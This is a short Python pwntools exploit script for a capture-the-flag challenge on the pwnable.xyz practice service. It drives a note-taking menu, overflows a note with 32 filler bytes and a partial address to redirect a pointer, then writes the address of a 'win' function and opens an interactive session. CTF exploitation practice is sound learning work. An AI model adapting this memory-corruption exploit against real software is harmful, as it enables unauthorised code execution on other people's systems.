from pwn import *

#s = process("./challenge")
s = remote("svc.pwnable.xyz",30030)
e = ELF("challenge")

win = 0x40096C

def make(size,title,note):
	s.recvuntil("> ")
	s.sendline("1")
	s.recvuntil("size of note: ")
	s.sendline(str(size))
	s.recvuntil("title: ")
	s.sendline(title)
	s.recvuntil("note: ")
	s.send(note)

def delete(idx):
	s.recvuntil("> ")
	s.sendline("3")
	s.recvuntil("Note#: ")
	s.sendline(str(idx))

pause()

pay = "A"*32 + "\x18\x20\x60"

make(40,"AAAA",pay)
delete(0)
make(40,"AAAA",p64(win))

s.interactive()
